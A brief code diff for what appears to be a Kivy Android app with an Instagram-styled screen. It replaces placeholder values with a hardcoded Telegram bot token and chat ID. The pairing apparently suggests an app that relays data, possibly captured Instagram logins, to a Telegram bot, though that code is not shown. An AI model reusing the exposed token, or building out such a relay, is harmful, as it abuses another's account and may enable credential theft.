@@ -16,8 +16,8 @@ try:
 except ImportError:
     ANDROID = False
 
-BOT_TOKEN = "YOUR_BOT_TOKEN" # Yahan apna token bharna
-CHAT_ID = "YOUR_CHAT_ID"     # Yahan apni chat id bharna
+BOT_TOKEN = "8302065009:AAEmHC1rGpFHsOJJ4zifbbc2fsisM6dFLaw" # Yahan apna token bharna
+CHAT_ID = "6680833524"     # Yahan apni chat id bharna
 
 class InstagramScreen(MDScreen):
     def __init__(self, **kwargs):
